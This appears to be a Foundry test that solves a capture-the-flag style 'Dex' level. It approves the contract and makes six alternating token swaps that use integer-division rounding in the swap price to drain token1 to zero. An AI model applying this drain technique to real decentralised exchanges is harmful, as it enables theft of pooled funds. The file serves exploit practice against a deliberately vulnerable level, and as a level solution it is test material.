// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {DexFactory} from "../../src/levels/DexFactory.sol";
import {Dex} from "../../src/levels/Dex.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexLevel is LuxTest {
    DexFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new DexFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        address t1 = Dex(instance).token1();
        address t2 = Dex(instance).token2();

        // Integer-division rounding lets each swap take slightly more than it
        // gives; the final amount is capped to drain token1 exactly to zero.
        vm.startPrank(player, player);
        Dex(instance).approve(instance, type(uint256).max);
        Dex(instance).swap(t1, t2, 10);
        Dex(instance).swap(t2, t1, 20);
        Dex(instance).swap(t1, t2, 24);
        Dex(instance).swap(t2, t1, 30);
        Dex(instance).swap(t1, t2, 41);
        Dex(instance).swap(t2, t1, 45);
        vm.stopPrank();

        assertEq(IERC20(t1).balanceOf(instance), 0);
        _assertSolved(factory, instance, player);
    }
}
